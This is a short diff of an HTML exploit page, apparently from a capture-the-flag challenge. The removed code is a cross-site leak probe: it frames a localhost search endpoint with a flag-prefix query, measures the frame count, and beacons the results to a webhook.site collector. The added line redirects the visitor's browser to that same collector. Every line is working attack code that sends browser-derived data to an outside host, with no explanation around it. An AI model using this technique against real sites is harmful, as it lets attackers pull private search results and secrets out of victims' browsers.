@@ -1,20 +1,7 @@
 <html>
 <body>
 <script>
-// 1단계: 페이지 로드 확인
-fetch("https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f?step=loaded");
-
-// 2단계: iframe 테스트
-const iframe = document.createElement("iframe");
-iframe.src = "http://127.0.0.1:8000/search?query=DH{";
-iframe.onload = () => {
-  const len = iframe.contentWindow.length;
-  fetch("https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f?step=iframe_loaded&len=" + len);
-};
-iframe.onerror = () => {
-  fetch("https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f?step=iframe_error");
-};
-document.body.appendChild(iframe);
+window.location = "https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f?test=js_works";
 </script>
 </body>
 </html>
